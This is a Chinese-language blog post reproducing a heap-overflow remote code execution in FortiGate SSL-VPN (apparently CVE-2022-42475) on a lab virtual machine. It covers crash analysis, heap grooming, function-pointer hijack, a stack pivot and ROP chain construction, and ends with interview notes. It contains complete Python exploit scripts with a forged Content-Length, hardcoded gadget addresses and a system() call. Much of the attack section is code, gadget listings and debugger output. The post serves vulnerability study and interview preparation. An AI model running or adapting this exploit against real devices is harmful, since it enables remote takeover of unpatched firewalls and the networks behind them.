─────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────── ► 0x16e3c27    movzx  eax, byte ptr [r14 + 0x41]
   0x16e3c2c    and    eax, 0x18
   0x16e3c2f    cmp    al, 8
   0x16e3c31    je     0x16e3c60                     &lt;0x16e3c60&gt;
    ↓
   0x16e3c60    mov    esi, 0x316001f
   0x16e3c65    mov    rdi, r12
   0x16e3c68    call   0x16f3d70                     &lt;0x16f3d70&gt;
 
   0x16e3c6d    test   rax, rax
   0x16e3c70    jne    0x16e3c33                     &lt;0x16e3c33&gt;
 
   0x16e3c72    lea    r13, [rbp - 0x40]
   0x16e3c76    mov    esi, 0x3685072
───────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────00:0000│ rsp 0x7ffd87902e80 —▸ 0x3685072 ◂— 'text/plain'
01:0008│-038 0x7ffd87902e88 —▸ 0x2f7fc4a ◂— 'text/html'
02:0010│-030 0x7ffd87902e90 ◂— 0x0
03:0018│-028 0x7ffd87902e98 ◂— 0xbcc68fe117a6a700
04:0020│-020 0x7ffd87902ea0 —▸ 0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 ◂— ...
05:0028│-018 0x7ffd87902ea8 —▸ 0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 ◂— ...
06:0030│-010 0x7ffd87902eb0 —▸ 0xaaf50e0 ◂— 'Fortinet_Factory'
07:0038│-008 0x7ffd87902eb8 —▸ 0x7fc0ccc54800 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 ◂— ...
─────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────── ► 0        0x16e3c27
   1        0x16e5923
   2        0x16e733e
   3        0x180a0cf
   4        0x180c505
   5        0x180c782
   6        0x180da5c
   7        0x180ede2
──────────────────────────────────────────────────────────────────────────────────────────
</code></pre>
<p>此时，查看寄存器 <code>R14</code> 的值是 <code>0x4141414141414141</code> ('AAAAAAAA')。</p>
<p>这<strong>明确地表明</strong>：之前的堆溢出已经覆盖了某个变量或指针，该变量/指针的值后来被加载到了 <code>R14</code> 寄存器中。现在，程序试图将 <code>R14</code> (即 <code>0x4141...</code>) 当作一个基地址，并尝试读取 <code>[R14 + 0x41]</code> 处的内存。由于 <code>0x4141...</code> 是一个无效的、由输入数据控制的地址，访问它自然会导致<strong>段错误 (Segmentation Fault)</strong>。</p>
<h2 id="漏洞利用">漏洞利用</h2>
<h3 id="劫持函数指针">劫持函数指针</h3>
<p>随便填充数据的话，最后很难达到一个可以利用的crash，我看<a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">Catalpa</a>这里直接就能触发<code>jmp rax</code>感觉还是挺不可思议的，我试了很多次，基本只能跳转到上面的<code>movzx  eax, byte ptr [r14 + 0x41]</code></p>
<p>那应该怎么才能成功劫持一个函数指针呢？</p>
<p>这里我试了很多方法，感觉还是<a href="https://forum.butian.net/share/2166">hac425</a>的思路稳定清晰，易于实现</p>
<p>简单来说，还是使用堆风水手法</p>
<p>文章中给出了完整的漏洞利用思路，这里我先拆开，单说如何成功劫持函数指针（应该是<code>handshake</code>函数的指针，orange的文章里有提到过）</p>
<ol>
<li>创建 60 个 sock 连接，并发送不完整的 http 请求，希望能在服务端分配多个 SSL 结构体</li>
<li>从第 40 个开始间隔释放 10 个 sock 链接，希望在服务端释放几个 SSL 结构体的 Hole.</li>
<li>分配用于溢出的 exp_sk</li>
<li>再分配 20 个 sock 连接，多分配几个 SSL 结构体</li>
<li>触发溢出，希望修改 SSL 结构体中的函数指针</li>
<li>给其他 socket 发送数据，等待函数指针调用</li>
</ol>
<p>这里给出溢出脚本：</p>
<pre><code class="language-python">import socket
import ssl
from pwn import *
 
 
path = &quot;/remote/login&quot;.encode()
 
ip = &quot;192.168.150.131&quot;
port = 10443
 
def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _socket.connect((ip, port))
    _default_context = ssl._create_unverified_context()
    _socket = _default_context.wrap_socket(_socket)
    return _socket
 
 
socks = []
 
for i in range(60):
    sk = create_ssl_ctx()
    data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.150.131\r\nContent-Length: 4096\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;
    sk.sendall(data)
    socks.append(sk)
    #sleep(1)
 
for i in range(20, 40, 2):
    sk = socks[i]
    sk.close()
    socks[i] = None
 
CL = &quot;115964116992&quot;
data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.150.131\r\nContent-Length: &quot; + CL.encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;

exp_sk = create_ssl_ctx()
 
for i in range(20):
    sk = create_ssl_ctx()
    socks.append(sk)
 
exp_sk.sendall(data)
 
exp_sk.sendall(b'\x90'*0x10000)
 
for sk in socks:
   if sk:
       data = b'C' * 40
       sk.sendall(data)

print(&quot;done&quot;)
</code></pre>
<p>这里有几点说明一下：</p>
<ul>
<li>用于溢出的<code>exp_sk</code>这里，其实host根本不重要，填什么都可以，实际连接目标由 <code>create_ssl_ctx()</code> 中的 <code>_socket.connect((ip, port))</code> 决定，重要的是cl值，只要cl值对，加上是一个应用层 HTTP 协议头，就能够触发</li>
<li>ssl/tls库或许会对触发crash有所影响，建议不要使用Ubuntu16，因为我一开始在Ubuntu16上进行了大量尝试，都不能触发crash，最后是依靠一种有点玄学的手段才能触发，后来发现跟Ubuntu16环境有关，具体来说
<ul>
<li>在Ubuntu22跟win11上的崩溃脚本都能稳定触发crash，但唯独Ubuntu16不可以，其中，Ubuntu16Python版本为2.7.12，Ubuntu22为2.7.18，win11为3.11.9</li>
<li>我怀疑是OpenSSL版本问题，因为16使用的是OpenSSL 1.0.2g，而Ubuntu22.04/win11都是OpenSSL 3.0.x</li>
<li>查看了FortiGate 7.2.4（我的实验虚拟机）：显示<code>set ssl-min-proto-version TLSv1-2</code>:，<strong>最低要求使用 TLS 1.2</strong> 进行连接，但其实Ubuntu16也是满足要求的，所以也不能彻底确定，或许之后有兴趣会继续探究</li>
</ul>
</li>
</ul>
<p>最后，在前人基础上，也是实现了<code>jmp crash</code>这一步</p>
<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250420174359795.png" alt="image-20250420174359795" loading="lazy"></figure>
<h3 id="确定偏移">确定偏移</h3>
<p>直接用<code>cyclic</code>，简单粗暴</p>
<p>将脚本略作修改：</p>
<pre><code class="language-python">exp_sk.sendall(data)
cyclic_pattern = cyclic(PATTERN_LENGTH, n=8)
exp_sk.sendall(cyclic_pattern)
# exp_sk.sendall(b'\x42'*0x10000)
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250420180047824.png" alt="image-20250420180047824" loading="lazy"></figure>
<h4 id="具体分析">具体分析</h4>
<pre><code class="language-c">__int64 __fastcall sub_1811260(__int64 a1, __int64 a2)
{
  int v2; // r14d
  __int64 v4; // rbx
  __int64 v5; // rax
  _DWORD *v6; // rax
  __int64 v7; // rsi

  v2 = 30;
  v4 = sub_18174B0(*(unsigned int *)(a1 + 144));
  register_named_callback(a2, &quot;send_expect_100&quot;, 0LL, 4LL, sub_1811020);
  register_named_callback(a2, &quot;read_post_data&quot;, 0LL, 1LL, sslvpn_read_post_data_cb);
  sub_181BD70(a2, sub_1810F80);
  sub_181BD90(a2, sub_1811180);
  if ( v4 )
    v2 = *(_DWORD *)(v4 + 68);
  v5 = sub_181B860(a1);
  if ( !v5 || (v6 = *(_DWORD **)(v5 + 56)) == 0LL || (v7 = 1000LL, (unsigned int)(*v6 - 6) &lt;= 2) )
    v7 = (unsigned int)(100 * v2);
  sub_181BD80(a2, v7, 0LL);
  return 0LL;
}
</code></pre>
<p>这是SSL结构体初始化函数</p>
<p>why：</p>
<ul>
<li><strong>目标参数 <code>a2</code>:</strong> 函数接收 <code>a2</code> 作为参数，并且随后多次将 <code>a2</code> 作为<strong>第一个参数</strong>传递给其他 <code>sub_...</code> 函数（如 <code>sub_181BC20</code>, <code>sub_181BD70</code>, <code>sub_181BD90</code>, <code>sub_181BD80</code>）。这通常意味着这些被调用的函数是在<strong>操作或设置 <code>a2</code> 指向的那个数据结构</strong>。</li>
</ul>
<p>这里会把字符串 <strong>read_post_data</strong>拷贝到距离结构体偏移为 <strong>200</strong>的地方</p>
<p>溢出函数指针：</p>
<pre><code class="language-c">__int64 __fastcall sub_180C0A0(__int64 a1, char a2)
{
  ......
      if ( v9 )
      {
        result = v8 + 96;
        if ( v9 != v8 + 96 )
        {
          v10 = *(__int64 (__fastcall **)(__int64))(v9 + 192);
          if ( v10 )
            return v10(a1);
          ......
}
</code></pre>
<p>这里看出，我们要劫持的函数指针在结构体偏移为 <strong>192</strong>的地方。</p>
<p>所以我们只要找到字符串 <strong>read_post_data</strong>，将它的地址减8，就能得到函数指针地址，再确定溢出开始的地址，两者相减，就得到了具体偏移</p>
<pre><code class="language-assembly">(gdb) i r $rdi
rdi            0x7f6edef01818   140114163406872
(gdb) x/10gx 0x7f6edef01818
0x7f6edef01818: 0x0000000000000000      0x0000000000000000
0x7f6edef01828: 0x0000000000000000      0x0000000000000000
0x7f6edef01838: 0x0000000000000000      0x0000000000000000
0x7f6edef01848: 0x0000000000000000      0x0000000000000000
0x7f6edef01858: 0x0000000000000000      0x0000000000000000
(gdb) x/10gx 0x7f6edef02638
0x7f6edef02638: 0x0000000000000000      0x736f705f64616572
0x7f6edef02648: 0x0000617461645f74      0x0000000000000000
0x7f6edef02658: 0x0000000000000000      0x0000000000000000
0x7f6edef02668: 0x0000000000000000      0x0000000000000000
0x7f6edef02678: 0x0000000000000000      0x0000000000000000
(gdb) x/s 0x7f6edef02640
0x7f6edef02640: &quot;read_post_data&quot;

</code></pre>
<h3 id="栈迁移">栈迁移</h3>
<p>​	仅仅控制程序跳转到<strong>一个</strong>地址通常是不够的。为了执行更复杂的操作，比如设置参数并调用 <code>system</code> 函数来执行命令，需要执行一系列指令。在有 NX (No-eXecute) 保护的系统上，不能简单地直接跳转到堆上你写入的 shellcode 来执行。因此，最常用的技术是<strong>面向返回的编程 (Return-Oriented Programming, ROP)</strong>。</p>
<p>​	目标：找到一个 gadget，它的功能是<strong>将 <code>RSP</code> 的值修改为你可控的某个地址</strong>，这个地址指向我们在堆溢出数据中布置好的 ROP 链。</p>
<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250422201016411.png" alt="image-20250422201016411" loading="lazy"></figure>
<p>看我们现在的GDB，rax跟rdx是可以被控制的，rax是用来控制流劫持的，所以，我们要找到一个类似<code>push rdx;pop rsp;ret</code>这样的，将<code>rdx</code>的值转为栈基址，从而实现栈迁移</p>
<pre><code class="language-bash">augustu@augustu-ubuntu22:~/Downloads/f724$ grep &quot;.*push.*rdx.*pop.*rsp.*ret.*&quot; gadgets.txt
0x0000000002b08c46 : clc ; push qword ptr [rsi + rdx*2 + 0x41] ; pop rsp ; pop r13 ; pop rbp ; ret
0x00000000019ff110 : pop rsp ; push rdx ; add bl, byte ptr [rbx + 0x41] ; pop rsp ; pop rbp ; ret
0x0000000002b08c47 : push qword ptr [rsi + rdx*2 + 0x41] ; pop rsp ; pop r13 ; pop rbp ; ret
0x0000000001d3379c : push rdx ; adc byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0x00000000019ff111 : push rdx ; add bl, byte ptr [rbx + 0x41] ; pop rsp ; pop rbp ; ret
</code></pre>
<p>这里找不到，只能使用类似的<code>0x1d3379c</code></p>
<p>算出来<code>rax</code>偏移为3613，<code>rdx</code>偏移为3421</p>
<pre><code>0x00000000005bb1e4 : pop rdi ; ret
0x0000000001143c4e : pop rsi ; ret
0x000000000264c78a : pop rdx ; ret

</code></pre>
<h3 id="构造rop">构造ROP</h3>
<h4 id="具体思路">具体思路</h4>
<p><code>rax</code>跟<code>rdx</code>偏移已经算出来了，所以我们的payload应该形如这样：</p>
<pre><code class="language-bash">|AAA（3421）| ROP_chain | CCC（192-len(payload)） | pivot_gadget |
</code></pre>
<p><code>pivot_gadget</code>就是我们刚刚选择的<code>0x1d3379c</code>:</p>
<p><code> push rdx ; adc byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret</code></p>
<p>注意，</p>
<pre><code class="language-bash">AAA（3421）| ROP_chain | CCC（192-len(payload)）
</code></pre>
<p>这里的长度为3421+192=3613，加上我们前面提到的<code>jmp rax</code>这个crash，所以这里<code>rax</code>会被赋值为<code>pivot_gadget</code>：<code>0x1d3379c</code></p>
<p>这里会将<code>rdx</code>的值（也就是我们<code>ROP_chain</code>的其实地址）压到栈中，然后<code>pop rsp</code>改变栈基址</p>
<p>注意，因为后面还有一句<code>pop rbp</code>，会把<code>rsp</code>的值+8，所以<code>ROP_chain</code>开头要填充八个字节，下面就可以随意构造我们的<code>ROP_chain</code>了</p>
<p>我们的最终目标是构造<code>system(cmd,0,0)</code></p>
<p>所以，要达成如下目标：</p>
<ul>
<li><code>rdi</code>寄存器指向<code>cmd</code>命令的地址</li>
<li><code>rsi</code>寄存器值为0</li>
<li><code>rdx</code>寄存器值为0</li>
</ul>
<p>后面两项很好解决，寻找<code>pop rdx; ret</code>以及<code>pop rsi ; ret</code>这两个gadget就可以</p>
<p>但因为程序中没有现成的命令，需要我们自己构造，我们就需要自己计算命令行字符串的地址，这里提供一种方法：</p>
<p>将<code>cmd_string = b&quot;/bin/busybox echo &gt; 2.txt&quot;+b'\x00' * 7</code>放在<code>ROP_chain</code>的最后（末尾要加7个<code>0x00</code>是因为<code>/bin/busybox echo &gt; 2.txt</code>一共有25个字节，读取字符串的时候需要读到<code>0x00</code>表示结束，25+7=32刚好为8的倍数）</p>
<p>但我们传给<code>rdi</code>需要为字符串的地址，注意：</p>
<ul>
<li>一开始的时候我们传给<code>rdx</code>的值就是<code>ROP_chain</code>的开头地址</li>
<li>开头的<code>b'B'*8</code>跟最后的字符串之间的长度是固定的</li>
<li>所以我们只需要给一个寄存器赋值为这个偏移，再让<code>rdx</code>加上这个寄存器，最后赋值给<code>rdi</code></li>
<li>就达到了我们的目的-&gt;给<code>rdi</code>寄存器传<code>cmd</code>命令的地址</li>
</ul>
<p>这里我选用<code>rax</code>寄存器作为这个目标寄存器</p>
<h4 id="构造过程">构造过程</h4>
<p>一开始需要把偏移传给<code>rax</code>寄存器，应该找一个<code>pop rax ; ret</code>，然后后面加上<code>offset</code>，就能达到给<code>rax</code>赋值的目的，但这里我遇到了一个很奇怪的事情：</p>
<p><code>offset</code>不能成功写入栈中，栈上把<code>offset</code>后面的一个<code>gadgets</code>写了两次，这里我始终没有思考明白</p>
<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250423220850049.png" alt="image-20250423220850049" loading="lazy"></figure>
<p>这里我最后只能写了两次<code>offset</code>（写两次<code>offset</code>反而能正常的都写入栈中），为了弹出多的一个<code>offset</code>，我只能放弃使用<code>pop rax ; ret</code>，寻找了一个里面能多<code>pop</code>掉一个的<code>gadgets</code></p>
<p>后面我使用了<code>add rax , rdx ; ret</code>，因为这个gadgets会将值加到<code>rax</code>寄存器上，所以要继续寻找一个类似<code>push rax ; pop rdi ; ret</code>的gadgets，但没有找到，只找到了</p>
<pre><code class="language-bash">0x0000000002ac0cb3 : push rax ; pop rbx ; pop r12 ; pop rbp ; ret
</code></pre>
<p>因为多了两个<code>pop</code> ，后面多加了两个junk来平衡栈</p>
<p>然后就是<code>push rbx ; pop rdi ; ret</code>将字符串地址传到<code>rdi</code>了</p>
<p>后面就是将<code>rsi</code>、<code>rdx</code>置0</p>
<h2 id="结果">结果</h2>
<p>可以看到，最终各个寄存器成功赋值，命令成功构造</p>
<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250423212104980.png" alt="image-20250423212104980" loading="lazy"></figure>
<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250423212143306.png" alt="image-20250423212143306" loading="lazy"></figure>
<h3 id="exp">exp</h3>
<p>完整利用脚本如下：</p>
<pre><code class="language-python">import socket
import ssl
from pwn import *
 
path = &quot;/remote/login&quot;.encode()
 
ip = &quot;192.168.150.131&quot;
port = 10443
PATTERN_LENGTH = 8000
 
def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _socket.connect((ip, port))
    _default_context = ssl._create_unverified_context()
    _socket = _default_context.wrap_socket(_socket)
    return _socket
 
 
socks = []
 
for i in range(60):
    sk = create_ssl_ctx()
    data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.150.131\r\nContent-Length: 4096\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;
    sk.sendall(data)
    socks.append(sk)
 
for i in range(20, 40, 2):
    sk = socks[i]
    sk.close()
    socks[i] = None
 
CL = &quot;115964116992&quot;
data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.150.131\r\nContent-Length: &quot; + CL.encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;

exp_sk = create_ssl_ctx()
 
for i in range(20):
    sk = create_ssl_ctx()
    socks.append(sk)
 
exp_sk.sendall(data)
pop_rax_pop_rbx_ret = p64(0x2982884)
add_rax_rdx_ret = p64(0x462268)
push_rax_pop_rbx_pop_r12_pop_rbp_ret = p64(0x2ac0cb3)
push_rbx_pop_rdi_ret = p64(0x80ede9)
pop_rsi_ret = 0x1143c4e
pop_rdx_ret = 0x264c78a
system_plt = 0x56DF45
pivot_gadget = p64(0x1d3379c)
cmd_string = b&quot;/bin/busybox echo &gt; 2.txt&quot;+ b'\x00' * 7
offset = 0x70


rop_chain = b&quot;B&quot;*8
rop_chain += pop_rax_pop_rbx_ret
rop_chain += p64(offset)
rop_chain += p64(offset)
# rop_chain += pop_r12_ret
rop_chain += add_rax_rdx_ret
rop_chain += push_rax_pop_rbx_pop_r12_pop_rbp_ret
rop_chain += b'F'*16
rop_chain += push_rbx_pop_rdi_ret
rop_chain += p64(pop_rsi_ret)
rop_chain += p64(0)
rop_chain += p64(pop_rdx_ret)
rop_chain += p64(0)
rop_chain += p64(system_plt)
rop_chain += cmd_string
payload = b'A'*3421 + rop_chain + b'C'*(192-len(rop_chain))+pivot_gadget +b'D'*200
exp_sk.sendall(payload)
for sk in socks:
   if sk:
       data = b'C' * 40
       sk.sendall(data)

print(&quot;done&quot;)
</code></pre>
<h2 id="面试要点">面试要点</h2>
<p>PDD面试的时候问到了这个漏洞，记录一下要点，一年前复现的，好多忘了</p>
<ol>
<li>
<p>“如何通过覆盖堆上函数指针，然后实现对栈指针RBP和RSP的控制？”</p>
<ul>
<li>
<p>我觉得想要解释这个问题，就要先解释劫持函数指针的部分</p>
<p>​	正如我复现过程中发现的，正常构造特殊CL值只能造成进程崩溃，而不能实现漏洞利用，因为漏洞函数处是一个回调函数，它不是一次性处理所有数据，而是循环调用来处理数据块，直到整个请求体处理完毕或者发生错误，如果我们的附加数据庞大的话，它会造成溢出，如果我们不另外附加数据，甚至进程会正常运行，如果溢出，只有在后面触发的时候，才会造成进程崩溃；</p>
<p>​	这时候，如果我们想覆盖堆上函数指针，就需要进行堆风水，简单来说，先布好局，让我们想要的结构体刚好处在溢出部分的边上，这样，溢出的时候就能覆盖到结构体的关键指针处，这时候如果我们的溢出数据是通过cyclic生成的，直接就能计算出偏移位置，这样，就成功覆盖了堆上的函数指针并获取偏移；</p>
</li>
<li>
<p>下面就是栈迁移的部分</p>
<p>​	这时候只能一次跳转，我们需要将跳转位置转移到我们能控制的地方，要把我们堆上的数据变成栈上的</p>
<p>​	这时候最理想的方式就是找一个gadgets，把rsp的值修改成我们堆上数据的地址，这个漏洞我们可控的寄存器有rax、rdx，并且rax还用于上一步的控制流劫持，那我们就要找一个类似push rdx;pop rsp;ret这样的，将rdx的值转换成栈基址，至于rbp，这点倒是无须关心，因为后续都是ROP链利用，直接进行rce，不需要执行原有代码了</p>
</li>
</ul>
</li>
<li>
<p>堆溢出时，伪造的<code>Content-Length</code>如何精确导致了后续<code>memcpy</code>可控大小的溢出，以及堆布局在其中的作用。</p>
<ul>
<li>简单来说，有一个函数，pool_alloc负责根据传入的CL值分配内存空间，但在具体汇编代码中，它会将存储CL值的结构体里的某个元素先转移到eax上（原来这个元素的值存储的位置是rax+0x18）</li>
<li>这样的话，如果CL值非常庞大就会导致前面的八位消失，比如0x1b00000000存到eax中，因为eax是32位寄存器，它只能存储0x0000 0000，后面的汇编代码中虽然又用到了rax，但这时候值已经被改变了，我记得是有一个lea esi,[rax+1]导致最后分配内存的时候，只能按照[eax+1]的值分配内存大小</li>
<li>并且后面会有memcpy函数会将我们附加的payload写入内存中，这就很容易造成堆溢出</li>
<li>加上我们之前使用堆风水进行的布局，就会导致payload溢出到关键结构体的函数指针中</li>
</ul>
</li>
</ol>

<span id="footnote"></span>
<div id = "warn"></div>
</div>
<div class="toc-container"><ul class="markdownIt-TOC">
<li><a href="#%E6%90%AD%E8%BD%BD%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83">搭载运行环境</a></li>
<li><a href="#%E6%90%AD%E5%BB%BA%E8%B0%83%E8%AF%95%E5%92%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">搭建调试和漏洞环境</a>
<ul>
<li><a href="#%E6%8F%90%E5%8F%96%E4%BA%8C%E8%BF%9B%E5%88%B6">提取二进制</a>
<ul>
<li><a href="#%E6%90%AD%E5%BB%BAgdb%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83">搭建GDB调试环境</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a>
<ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E5%AF%BB">漏洞探寻</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a>
<ul>
<li><a href="#%E5%8A%AB%E6%8C%81%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88">劫持函数指针</a></li>
<li><a href="#%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB">确定偏移</a>
<ul>
<li><a href="#%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90">具体分析</a></li>
</ul>
</li>
<li><a href="#%E6%A0%88%E8%BF%81%E7%A7%BB">栈迁移</a></li>
<li><a href="#%E6%9E%84%E9%80%A0rop">构造ROP</a>
<ul>
<li><a href="#%E5%85%B7%E4%BD%93%E6%80%9D%E8%B7%AF">具体思路</a></li>
<li><a href="#%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B">构造过程</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E7%BB%93%E6%9E%9C">结果</a>
<ul>
<li><a href="#exp">exp</a></li>
</ul>
</li>
<li><a href="#%E9%9D%A2%E8%AF%95%E8%A6%81%E7%82%B9">面试要点</a></li>
</ul>
</li>
</ul>
</div>
</div>
<div id="fullPage"><canvas id="canvas"></canvas></div>
</article>
<div id="eof"><span>EOF</span></div><div class="round-shape-one"></div>
<section>
<div class="doc_comments">

</div></section>
</div></div></div><script>
"use strict";!function(){for(var n=document.getElementsByTagName("pre"),e=n.length,s=0;s<e;s++){n[s].innerHTML='<span class="line-number"></span>'+n[s].innerHTML+'<span class="cl"></span>';for(var a=n[s].innerHTML.split(/\n/).length,r=0;r<a-1;r++){n[s].getElementsByTagName("span")[0].innerHTML+="<span>"+(r+1)+"</span>"}}}();
let mainNavLinks=document.querySelectorAll(".markdownIt-TOC a");window.addEventListener("scroll",event=>{let fromTop=window.scrollY;mainNavLinks.forEach((link,index)=>{let section=document.getElementById(decodeURI(link.hash).substring(1));let nextSection=null
if(mainNavLinks[index+1]){nextSection=document.getElementById(decodeURI(mainNavLinks[index+1].hash).substring(1));}
if(section.offsetTop<=fromTop){if(nextSection){if(nextSection.offsetTop>fromTop){link.classList.add("currentToc");}else{link.classList.remove("currentToc");}}else{link.classList.add("currentToc");}}else{link.classList.remove("currentToc");}});});
var h=document.documentElement,b=document.body,st="scrollTop",sh="scrollHeight",progress=document.querySelector(".progress"),scroll;document.addEventListener("scroll",function(){scroll=(h[st]||b[st])/((h[sh]||b[sh])-h.clientHeight)*100;progress.style.setProperty("--scroll",scroll+"%")});
var wxScale=new WxScale({fullPage:document.querySelector("#fullPage"),canvas:document.querySelector("#canvas")});var imgBox=document.querySelectorAll("#md_block img");for(var i=0;i<imgBox.length;i++){imgBox[i].onclick=function(e){wxScale.start(this)}};
</script>
<a id="scrollUp" href="#top" style="position: fixed; z-index: 2147483647; display: block;"></a><div class="footer animated fadeInDown"><div class="site_footer"><div class="mysocials"><div class="my_socials"><a href="https://github.com/AugustuXue"title="github"><i class="iconfont icon-github"></i></a><a href="https://augu5tu.github.io/atom.xml"title="rss"><i class="iconfont icon-rss"></i></a></div></div><div class="copyright"id="copyright">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>Copyright © 2018-2020 <a href="https://augu5tu.github.io" style="margin:0;">Augu5tu-飞光</a>.</div>
<span style="display: inline;margin-right:15px;">👁<strong><span id="busuanzi_value_site_uv"></span></strong></span><span id="busuanzi_container_page_pv" style="display: inline;"><span>📚<strong>5</strong> posts</span></div></div>
<script>
console.log("\n %c \u26a1Theme: Bitcron-pro Author's Blog:https://blog.blinkstar.cn  Writen By Serence  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;", );
</script>
<script src="https://cdn.jsdelivr.net/npm/instant.page@3.0.0/instantpage.min.js" type="module" defer></script>
<script type="text/javascript" async src="https://augu5tu.github.io/media/js/prism.js"></script>
</body>
</html>